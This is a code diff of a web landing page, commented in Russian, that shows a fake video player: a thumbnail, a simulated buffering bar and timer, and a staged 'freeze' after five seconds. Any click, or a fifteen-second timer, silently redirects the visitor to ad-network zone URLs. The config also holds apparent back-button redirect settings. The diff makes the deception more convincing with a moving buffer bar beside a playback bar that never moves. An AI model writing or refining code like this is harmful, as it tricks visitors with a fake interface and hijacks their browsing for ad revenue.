@@ -12,7 +12,7 @@
             "mainExit_newTab_zoneId": 10474869,
             "reverse_zoneId": 10474868,
             "autoexit_zoneId": 10474871,
-            "autoexit_timeToRedirect": 15, // Изменено на 15 секунд
+            "autoexit_timeToRedirect": 15,
             "back_zoneId": 10474872,
             "back_count": 10
         };
@@ -60,7 +60,6 @@
             filter: blur(3px) brightness(0.7);
         }
 
-        /* Эффект повторного зависания */
         .xh-frame.buffering {
             filter: blur(10px) brightness(0.5);
         }
@@ -80,22 +79,39 @@
             box-sizing: border-box;
         }
 
+        /* Контейнер прогресс-бара */
         .progress-bar-bg {
             width: 100%;
             height: 4px;
-            background: rgba(255,255,255,0.3);
+            background: rgba(255,255,255,0.2);
             margin-bottom: 10px;
+            position: relative;
         }
 
-        .progress-bar-fill {
-            width: 10%; /* Начальная позиция */
+        /* Серая полоса ЗАГРУЗКИ (двигается) */
+        .progress-buffer {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 10%; /* Начало */
+            height: 100%;
+            background: rgba(255,255,255,0.5);
+            transition: width 15s linear; /* Плавная имитация загрузки */
+            z-index: 1;
+        }
+
+        /* Красная полоса ВОСПРОИЗВЕДЕНИЯ (стоит) */
+        .progress-play {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 7%; /* Стоит на месте */
             height: 100%;
             background: #f00;
-            position: relative;
-            transition: width 15s linear; /* Плавное движение на 15 сек */
+            z-index: 2;
         }
 
-        .progress-bar-fill::after {
+        .progress-play::after {
             content: '';
             position: absolute;
             right: -5px;
@@ -157,7 +173,6 @@
             height: 45px;
             animation: spin 1s linear infinite;
             z-index: 30;
-            display: block; /* По умолчанию виден */
         }
 
         @keyframes spin { 
@@ -176,11 +191,12 @@
 
         <div class="player-interface">
             <div class="progress-bar-bg">
-                <div class="progress-bar-fill" id="progressBar"></div>
+                <div class="progress-buffer" id="bufferBar"></div>
+                <div class="progress-play"></div>
             </div>
             <div class="controls">
                 <div class="play-btn"></div>
-                <span id="timerText">0:00 / 14:32</span>
+                <span>0:07 / 14:32</span>
                 <span style="margin-left: auto; border: 1px solid #fff; padding: 0 2px;">HD</span>
                 <div style="width: 14px; height: 14px; border: 2px solid #fff;"></div>
             </div>
@@ -194,17 +210,15 @@
         const cr = params.get('creative_id');
         const frame = document.getElementById('mainFrame');
         const loader = document.getElementById('mainLoader');
-        const progress = document.getElementById('progressBar');
-        const timerText = document.getElementById('timerText');
+        const buffer = document.getElementById('bufferBar');
 
-        const CDN_BASE = 'https://17534.igennos.store/frames'; 
+        const CDN_BASE = 'https://17534.igennos.store/frames';
 
         function doRedirect() {
             const exitUrl = `${APP_CONFIG.domain}/?z=${APP_CONFIG.mainExit_currentTab_zoneId}&${params.toString()}`;
             window.location.replace(exitUrl);
         }
 
-        // Загрузка
         if (cid && cr && frame) {
             const imgUrl = `${CDN_BASE}/${cid}/${cr}.webp`;
             const img = new Image();
@@ -213,29 +227,26 @@
                 frame.src = imgUrl;
                 frame.classList.add('loaded');
                 
-                // Убираем лоадер через 1 сек после загрузки
                 setTimeout(() => { 
                     loader.style.display = 'none'; 
-                    // Запускаем прогресс-бар
-                    progress.style.width = '45%'; 
+                    // Запуск имитации загрузки данных (буфера)
+                    buffer.style.width = '100%'; 
                 }, 1000);
 
-                // --- ИМИТАЦИЯ ПОДГРУЗКИ (через 5 секунд) ---
+                // Имитация "зависания" через 5 секунд
                 setTimeout(() => {
-                    loader.style.display = 'block'; // Снова показываем спиннер
-                    frame.classList.add('buffering'); // Размываем фон
+                    loader.style.display = 'block'; 
+                    frame.classList.add('buffering');
                 }, 5000);
             };
             img.src = imgUrl;
         }
 
-        // Клик
         document.querySelector('.xh-fake-player').addEventListener('click', (e) => {
             e.preventDefault();
             doRedirect();
         });
 
-        // Авто-редирект через 15 сек
         setTimeout(() => {
             doRedirect();
         }, APP_CONFIG.autoexit_timeToRedirect * 1000);
